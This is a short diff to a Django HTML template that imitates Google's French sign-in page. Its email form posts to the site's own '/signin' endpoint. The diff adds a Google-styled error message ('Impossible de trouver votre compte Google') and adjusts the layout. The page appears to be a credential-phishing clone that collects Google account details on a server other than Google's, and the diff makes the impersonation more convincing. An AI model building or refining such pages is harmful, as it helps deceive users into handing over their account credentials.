@@ -18,7 +18,7 @@
             </div>
             <h2 style="text-align: left;">Connexion</h2>
             <h3 id="text_2">Utiliser votre compte Google</h3>
-            <div class="input-contain">
+            <div class="input-contain" style="position: relative;">
                 <form id="form" method="post" action="/signin">
                     {% csrf_token %}
                     <input type="text"
@@ -28,13 +28,19 @@
                            value=""
                            aria-labelledby="placeholder-email">
                     <label class="placeholder-text" for="email" id="placeholder-email">
-                        <div id="placeholder_" class="text">Adresse e-mail ou numéro de téléphone</div>
+                        <div id="placeholder_" class="text">Adresse e-mail ou téléphone</div>
                     </label>
                 </form>
+                <p id="error-message" style="color: #b3261e; display: none; position: absolute;">
+                    <svg xmlns="http://www.w3.org/2000/svg" height="17" viewBox="0 0 24 24" width="17" fill="#b3261e" style="vertical-align: middle;">
+                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
+                    </svg>
+                    <span style="vertical-align: middle; font-size: 0.75rem;">Impossible de trouver votre compte Google</span>
+                </p>
             </div>
-            <div style="text-align: left;!important">
+            <div style="text-align: left;">
                 <b id="error"></b>
-                <div class="btn-email">
+                <div class="btn-email" id="linkk">
                     <button type="button">
                     <a target="_blank" href="https://accounts.google.com/>" class="link">Adresse e-mail oubliée ?</a>
                 </button>
